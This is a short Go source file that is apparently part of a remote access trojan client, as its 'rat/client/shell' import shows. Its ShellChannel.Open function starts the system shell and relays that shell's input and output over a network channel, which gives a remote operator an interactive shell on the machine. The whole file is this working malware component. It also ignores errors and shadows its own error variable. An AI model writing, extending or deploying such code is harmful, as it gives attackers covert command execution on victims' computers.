package main

import (
	"bufio"
	"fmt"
	"io"
	"os/exec"
	"rat/client/shell"
)

type ShellChannel struct {
	Action int    `network:"receive"`
	Data   string `network:"send,receive"`
}

func (packet ShellChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
	cmd := exec.Command(shell.GetDefault())
	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	cmd.Stderr = cmd.Stdout
	cmd.Start()

	defer cmd.Process.Kill()
	defer channel.Close()

	go func() {
		r := bufio.NewReader(stdout)
		b := make([]byte, 1024)
		for {
			n, err := r.Read(b)
			if err != nil {
				break
			}
			_, err = channel.Write(b[:n])
			if err != nil {
				break
			}
		}
	}()

	var err error
	r := bufio.NewReader(channel)
	b := make([]byte, 1024)
	for {
		n, err := r.Read(b)
		if err != nil {
			break
		}
		_, err = stdin.Write(b[:n])
		if err != nil {
			break
		}
	}

	fmt.Println("end")

	return err
}
